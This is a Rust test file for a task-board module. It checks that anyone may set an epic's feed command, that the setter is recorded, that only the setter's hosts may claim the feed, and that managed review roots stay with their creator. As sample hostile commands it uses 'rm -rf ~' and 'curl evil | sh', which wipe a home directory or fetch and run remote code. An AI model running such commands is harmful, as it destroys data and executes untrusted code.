//! Task #98746 (V8, V9) as it stands with one person using the store:
//! `feed_command` may be changed by anyone and records its setter, the claim
//! rules follow the setter, and a managed PR Reviews root is its creator's own
//! (`docs/plans/2026-11-23-remove-workspaces.md`, R6, R7).

use dispatch_spacetime_module as module;

use super::*;

fn host(id: &str, owner: &str) -> module::Host {
    module::Host {
        id: id.into(),
        label: String::new(),
        owner: owner.into(),
    }
}

fn claim(id: i64, epic_id: i64, host: &str) -> module::PollOwner {
    module::PollOwner {
        id,
        scope: POLL_SCOPE_EPIC.into(),
        scope_id: epic_id,
        host: host.into(),
        claimed_at: TEST_STAMP.into(),
    }
}

fn epic(id: i64, creator: &str) -> module::Epic {
    module::Epic {
        id,
        created_by: creator.into(),
        created_at: TEST_STAMP.into(),
        updated_at: TEST_STAMP.into(),
        ..module::blank_epic()
    }
}

/// Epic 1 is `bob`'s, with a feed command, and hosts `h-me`, `h-bob` and
/// `h-carol` each belong to their person.
fn scenario() -> MemoryReducerCaller {
    let (caller, _rows) = caller();
    let caller = caller.with_sender("me").with_identity_rules();
    {
        let mut t = caller.lock();
        t.epics.insert(
            1,
            module::Epic {
                feed_command: "gh-feed".into(),
                ..epic(1, "bob")
            },
        );
        for h in [
            host("h-me", "me"),
            host("h-bob", "bob"),
            host("h-carol", "carol"),
        ] {
            t.hosts.insert(h.id.clone(), h);
        }
    }
    caller
}

/// Make `who` the identity of the next calls, as a second board would be.
fn act_as(caller: &mut MemoryReducerCaller, who: &str) {
    caller.sender = who.into();
}

fn claim_hosts(caller: &MemoryReducerCaller) -> Vec<String> {
    let mut hosts: Vec<String> = caller
        .lock()
        .poll_owners
        .values()
        .map(|p| p.host.clone())
        .collect();
    hosts.sort();
    hosts
}

fn give_claims(caller: &MemoryReducerCaller) {
    let mut t = caller.lock();
    for p in [claim(1, 1, "h-bob"), claim(2, 1, "h-me")] {
        t.poll_owners.insert(p.id, p);
    }
}

// -- V8: anyone may change feed_command; the change records its setter -------

async fn set_command(caller: &mut MemoryReducerCaller, who: &str) -> ReducerOutcome {
    act_as(caller, who);
    caller
        .patch_epic(
            EpicId(1),
            bindings::EpicPatch {
                feed_command: Some("rm -rf ~".into()),
                ..blank_epic_patch()
            },
        )
        .await
        .unwrap()
}

/// R7: anyone may change a command; the setter record keeps it off every other
/// machine.
#[tokio::test]
async fn anyone_may_change_it() {
    for who in ["bob", "me", "carol"] {
        let mut caller = scenario();
        give_claims(&caller);
        let outcome = set_command(&mut caller, who).await;
        assert!(
            matches!(outcome, ReducerOutcome::Applied(_)),
            "{who}: {outcome:?}"
        );
        assert_eq!(caller.lock().epics[&1].feed_command, "rm -rf ~");
        assert_eq!(caller.lock().epics[&1].feed_command_set_by, who);
    }
}

/// A real change records its author and drops the claims of every host whose
/// owner is not that person, so the author's own host can claim the feed.
#[tokio::test]
async fn changing_the_command_records_the_setter_and_releases_other_claims() {
    let mut caller = scenario();
    give_claims(&caller); // h-bob and h-me
    let outcome = set_command(&mut caller, "me").await; // not the creator
    assert!(matches!(outcome, ReducerOutcome::Applied(_)), "{outcome:?}");
    assert_eq!(caller.lock().epics[&1].feed_command_set_by, "me");
    assert_eq!(claim_hosts(&caller), ["h-me"]);
}

#[tokio::test]
async fn keeping_the_command_keeps_the_setter_and_the_claims() {
    let mut caller = scenario();
    give_claims(&caller);
    act_as(&mut caller, "bob");
    caller
        .patch_epic(
            EpicId(1),
            bindings::EpicPatch {
                feed_command: Some("gh-feed".into()),
                title: Some("renamed".into()),
                ..blank_epic_patch()
            },
        )
        .await
        .unwrap();
    assert_eq!(caller.lock().epics[&1].feed_command_set_by, "");
    assert_eq!(claim_hosts(&caller), ["h-bob", "h-me"]);
}

/// A new epic that carries a command is a command set by its creator.
#[tokio::test]
async fn creating_an_epic_with_a_command_records_its_creator_as_the_setter() {
    let mut caller = scenario();
    act_as(&mut caller, "carol");
    let id = caller
        .create_epic(bindings::Epic {
            feed_command: "curl evil | sh".into(),
            // A client's claim about who set it is ignored.
            feed_command_set_by: "bob".into(),
            ..blank_bindings_epic()
        })
        .await
        .unwrap();
    assert_eq!(caller.lock().epics[&id.0].feed_command_set_by, "carol");
}

#[tokio::test]
async fn creating_an_epic_without_a_command_records_no_setter() {
    let mut caller = scenario();
    act_as(&mut caller, "carol");
    let id = caller
        .create_epic(bindings::Epic {
            ..blank_bindings_epic()
        })
        .await
        .unwrap();
    assert_eq!(caller.lock().epics[&id.0].feed_command_set_by, "");
}

#[tokio::test]
async fn setting_the_command_it_already_has_is_not_a_change() {
    let mut caller = scenario();
    act_as(&mut caller, "carol");
    let outcome = caller
        .patch_epic(
            EpicId(1),
            bindings::EpicPatch {
                feed_command: Some("gh-feed".into()),
                title: Some("renamed".into()),
                ..blank_epic_patch()
            },
        )
        .await
        .unwrap();
    assert!(matches!(outcome, ReducerOutcome::Applied(_)), "{outcome:?}");
}

// -- V9: a managed root is its creator's own ------------------------------------

#[test]
fn each_person_provisions_a_managed_root_of_their_own() {
    let mut caller = scenario();
    for who in ["bob", "carol"] {
        act_as(&mut caller, who);
        caller
            .apply_ensure_managed_epics("reviews.sh".into(), 600, String::new(), 0)
            .unwrap();
    }
    let t = caller.lock();
    let roots: Vec<&module::Epic> = t
        .epics
        .values()
        .filter(|e| e.feed_role == module::ROLE_REVIEWS_PARENT)
        .collect();
    assert_eq!(roots.len(), 2, "one root each, not one shared root");
    let mut creators: Vec<&str> = roots.iter().map(|e| e.created_by.as_str()).collect();
    creators.sort();
    assert_eq!(creators, ["bob", "carol"]);
}

#[test]
fn a_root_its_creator_finds_is_retargeted() {
    let mut caller = scenario();
    caller.lock().epics.insert(
        7,
        module::Epic {
            feed_role: module::ROLE_REVIEWS_PARENT.into(),
            feed_command: "old".into(),
            ..epic(7, "bob")
        },
    );
    act_as(&mut caller, "bob");
    caller
        .apply_ensure_managed_epics("reviews.sh".into(), 600, String::new(), 0)
        .unwrap();
    let t = caller.lock();
    assert_eq!(t.epics[&7].feed_command, "reviews.sh");
    assert_eq!(
        t.epics
            .values()
            .filter(|e| e.feed_role == module::ROLE_REVIEWS_PARENT)
            .count(),
        1
    );
}

#[test]
fn another_persons_root_is_not_reused_or_rewritten() {
    let mut caller = scenario();
    caller.lock().epics.insert(
        7,
        module::Epic {
            feed_role: module::ROLE_REVIEWS_PARENT.into(),
            feed_command: "bobs-command".into(),
            ..epic(7, "bob")
        },
    );
    act_as(&mut caller, "carol");
    caller
        .apply_ensure_managed_epics("carols.sh".into(), 600, String::new(), 0)
        .unwrap();
    let t = caller.lock();
    assert_eq!(t.epics[&7].feed_command, "bobs-command");
    assert!(t
        .epics
        .values()
        .any(|e| e.feed_role == module::ROLE_REVIEWS_PARENT && e.created_by == "carol"));
}

// -- M2: a claim needs an existing scope, and a feed epic its setter ----------

fn blank_bindings_epic() -> bindings::Epic {
    module::blank_epic().into()
}

async fn claim_for(
    caller: &mut MemoryReducerCaller,
    who: &str,
    target: PollScopeId,
    host: &str,
) -> ReducerOutcome {
    act_as(caller, who);
    caller.claim_poll_owner(target, host.into()).await.unwrap()
}

async fn override_for(
    caller: &mut MemoryReducerCaller,
    who: &str,
    target: PollScopeId,
    host: &str,
) -> ReducerOutcome {
    act_as(caller, who);
    caller
        .override_poll_owner(target, host.into())
        .await
        .unwrap()
}

/// R2: no sight check; an existing scope suffices.
#[tokio::test]
async fn a_claim_on_another_persons_task_is_allowed() {
    let mut caller = scenario();
    caller.lock().tasks.insert(
        1,
        module::Task {
            id: 1,
            owner: "bob".into(),
            ..module::blank_task()
        },
    );
    let out = claim_for(
        &mut caller,
        "carol",
        PollScopeId::Task(TaskId(1)),
        "h-carol",
    )
    .await;
    assert!(matches!(out, ReducerOutcome::Applied(_)), "{out:?}");
}

/// Carol's host may not poll a command bob wrote, claimed or overridden.
#[tokio::test]
async fn a_host_whose_owner_did_not_set_the_command_cannot_claim_the_feed() {
    let mut caller = scenario();
    for out in [
        claim_for(
            &mut caller,
            "carol",
            PollScopeId::Epic(EpicId(1)),
            "h-carol",
        )
        .await,
        override_for(
            &mut caller,
            "carol",
            PollScopeId::Epic(EpicId(1)),
            "h-carol",
        )
        .await,
    ] {
        assert!(matches!(out, ReducerOutcome::Refused(_)), "{out:?}");
    }
    assert!(claim_hosts(&caller).is_empty());
    // The creator's own host may (no setter recorded: it falls back to created_by).
    let out = claim_for(&mut caller, "bob", PollScopeId::Epic(EpicId(1)), "h-bob").await;
    assert!(matches!(out, ReducerOutcome::Applied(_)), "{out:?}");
    assert_eq!(claim_hosts(&caller), ["h-bob"]);
}

#[tokio::test]
async fn a_recorded_setter_wins_over_the_creator() {
    let mut caller = scenario();
    caller.lock().epics.get_mut(&1).unwrap().feed_command_set_by = "carol".into();
    let out = claim_for(&mut caller, "bob", PollScopeId::Epic(EpicId(1)), "h-bob").await;
    assert!(matches!(out, ReducerOutcome::Refused(_)), "{out:?}");
    let out = claim_for(
        &mut caller,
        "carol",
        PollScopeId::Epic(EpicId(1)),
        "h-carol",
    )
    .await;
    assert!(matches!(out, ReducerOutcome::Applied(_)), "{out:?}");
}

#[tokio::test]
async fn an_epic_without_a_command_can_be_claimed_by_any_host() {
    let mut caller = scenario();
    caller.lock().epics.get_mut(&1).unwrap().feed_command = String::new();
    let out = claim_for(
        &mut caller,
        "carol",
        PollScopeId::Epic(EpicId(1)),
        "h-carol",
    )
    .await;
    assert!(matches!(out, ReducerOutcome::Applied(_)), "{out:?}");
}

/// `core.allium: UniqueFeedRolePerParent`: provisioning finds a role sub-epic
/// under its own root even when someone else made it, rather than inserting a
/// second one beside it.
#[test]
fn provisioning_does_not_duplicate_a_role_sub_epic_someone_else_made() {
    let caller = scenario();
    {
        let mut t = caller.lock();
        t.epics.insert(
            10,
            module::Epic {
                feed_role: module::ROLE_REVIEWS_PARENT.into(),
                feed_command: "reviews.sh".into(),
                feed_interval_secs: 600,
                ..epic(10, "me")
            },
        );
        t.epics.insert(
            11,
            module::Epic {
                parent_epic_id: 10,
                feed_role: module::ROLE_MY_REVIEWS.into(),
                ..epic(11, "bob")
            },
        );
    }
    caller.align_next_epic_id(20);
    caller
        .apply_ensure_managed_epics("reviews.sh".into(), 600, String::new(), 0)
        .unwrap()
        .applied()
        .unwrap();
    let t = caller.lock();
    let roots: Vec<i64> = t
        .epics
        .values()
        .filter(|e| e.parent_epic_id == 0 && e.feed_role == module::ROLE_REVIEWS_PARENT)
        .map(|e| e.id)
        .collect();
    assert_eq!(roots, [10], "the root is reused");
    let my_reviews = t
        .epics
        .values()
        .filter(|e| e.parent_epic_id == 10 && e.feed_role == module::ROLE_MY_REVIEWS)
        .count();
    assert_eq!(my_reviews, 1);
}

// -- a move takes a task out of nobody's reach (remove-workspaces R2) --------

/// The module's `a_task_move_or_detach_keeps_its_claim_and_bookmarks`: a
/// move to another epic and a detach onto a board keep bob's claim on the
/// task and both people's bookmarks.
#[tokio::test]
async fn a_task_move_or_detach_keeps_its_claim_and_bookmarks() {
    let caller = scenario();
    {
        let mut t = caller.lock();
        t.epics.insert(2, epic(2, "me"));
        t.tasks.insert(
            10,
            module::Task {
                id: 10,
                epic_id: 1,
                created_at: TEST_STAMP.into(),
                updated_at: TEST_STAMP.into(),
                ..module::blank_task()
            },
        );
        t.poll_owners.insert(
            3,
            module::PollOwner {
                scope: POLL_SCOPE_TASK.into(),
                scope_id: 10,
                ..claim(3, 0, "h-bob")
            },
        );
        for who in ["me", "bob"] {
            let id = module::bookmark_id(who, 10);
            t.bookmarks.insert(
                id.clone(),
                module::Bookmark {
                    id,
                    task_id: 10,
                    subscriber: who.into(),
                },
            );
        }
    }
    let bookmarked = |caller: &MemoryReducerCaller| {
        let mut who: Vec<String> = caller
            .lock()
            .bookmarks
            .values()
            .filter(|b| b.task_id == 10)
            .map(|b| b.subscriber.clone())
            .collect();
        who.sort();
        who
    };
    let everyone = vec!["bob".to_string(), "me".to_string()];

    caller
        .set_task_epic(TaskId(10), Some(EpicId(2)), String::new())
        .await
        .unwrap()
        .applied()
        .unwrap();
    assert_eq!(claim_hosts(&caller), vec!["h-bob".to_string()], "move");
    assert_eq!(bookmarked(&caller), everyone, "move");

    caller
        .set_task_epic(TaskId(10), None, String::new())
        .await
        .unwrap()
        .applied()
        .unwrap();
    assert_eq!(claim_hosts(&caller), vec!["h-bob".to_string()], "detach");
    assert_eq!(bookmarked(&caller), everyone, "detach");
}

/// `core.allium: UniqueFeedRolePerParent`: re-parenting an epic under a
/// parent that already holds an epic with its feed role is refused, and the
/// epic stays where it was. (The workspace move this replaced is gone; a
/// re-parent is the one move left that can land a role on a twin.)
#[tokio::test]
async fn reparenting_onto_a_twin_of_its_role_is_refused() {
    let caller = scenario();
    {
        let mut t = caller.lock();
        for id in [10, 11] {
            t.epics.insert(id, epic(id, "me"));
        }
        for (id, parent) in [(5, 10), (6, 11)] {
            t.epics.insert(
                id,
                module::Epic {
                    parent_epic_id: parent,
                    feed_role: module::ROLE_MY_REVIEWS.into(),
                    ..epic(id, "me")
                },
            );
        }
    }
    let outcome = caller
        .patch_epic(
            EpicId(6),
            bindings::EpicPatch {
                parent_epic_id: Some(10),
                ..blank_epic_patch()
            },
        )
        .await
        .unwrap();
    match outcome {
        ReducerOutcome::Refused(why) => assert!(why.contains("already exists"), "{why}"),
        other => panic!("expected a refusal, got {other:?}"),
    }
    assert_eq!(caller.lock().epics[&6].parent_epic_id, 11);
}
